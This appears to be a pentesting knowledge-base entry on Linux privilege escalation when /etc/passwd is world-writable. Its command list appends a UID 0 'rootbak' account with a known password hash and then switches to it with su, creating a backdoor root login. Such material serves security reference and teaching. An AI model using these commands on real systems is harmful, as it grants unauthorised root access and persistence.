---
id: priv-003
title: "Writable /etc/passwd"
category: privilege_escalation
tags: [passwd, file-write, linux-privesc, credential-manipulation]
platform: [linux]
commands:
  - "ls -la /etc/passwd"
  - "openssl passwd -1 -salt xyz password123"
  - "echo 'rootbak:$1$xyz$hashedpassword:0:0:root:/root:/bin/bash' >> /etc/passwd"
  - "su rootbak"
references:
  - "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd"
  - "https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/"
---

If the `/etc/passwd` file is world-writable due to misconfiguration, an attacker can append a new entry with UID 0 and a known password hash to create a backdoor root account. The password hash is generated using `openssl passwd` or `mkpasswd`, and the crafted line follows the standard `username:hash:UID:GID:comment:home:shell` format with UID and GID set to 0. After appending the entry, the attacker can switch to the new root-equivalent account using `su`, bypassing `/etc/shadow` entirely since `/etc/passwd` hashes take precedence when present.
